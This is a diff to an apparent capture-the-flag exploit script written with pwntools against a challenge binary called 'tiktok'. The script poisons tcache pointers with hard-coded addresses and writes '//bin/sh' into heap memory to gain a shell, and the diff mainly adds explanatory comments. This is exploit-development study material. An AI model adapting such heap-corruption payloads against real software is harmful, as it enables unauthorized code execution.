@@ -815,6 +815,8 @@ from pwn import *
 
 p = process(["./tiktok"])
 
+# p = process(["rr", "record", "./tiktok"]) # Running it with rr
+
 def import_song(path):
     p.readuntil("Choice:")
     p.sendline("1")
@@ -904,9 +906,9 @@ remove_song("34") # L (overwritten by K)
 
 play_song("44") # Reads from STDIN
 p.sendline("-1") # Size of "lyrics", gets A from tcache
-chunkA = p64(0x00) * 2 # Fills chunk A nullbytes
+chunkA = p64(0x00) * 2 # Fills chunk A nullbytes, p64() will send a little endian bytes object by default 
 chunkB = p64(0x00) + p64(0x21) + p64(0x404078) + p64(0x00) # Overwrites chunk B tcache ptr w/ addr of song[0].fd
-chunkZ = p64(0x00) + p64(0x20) + b"/bin/sh" + p64(0x00) # Overwrites chunk Z data w/ ""/bin/sh"" and null bytes
+chunkZ = p64(0x00) + p64(0x20) + b"//bin/sh" + p64(0x00) # Overwrites chunk Z data w/ ""/bin/sh"" and null bytes, 2 '/' at the front to make it a clean 8 bytes (the b makes it a bytes object so python3 will concatenate it to the p64() bytes objects)
 chunkC = p64(0x00) + p64(0x311) + p64(0x4040c8) # Overwrites chunk C tcache ptr w/ addr of song[1].lyrics_ptr
 p.send(chunkA + chunkB + chunkZ + chunkC) # Sends payload
 
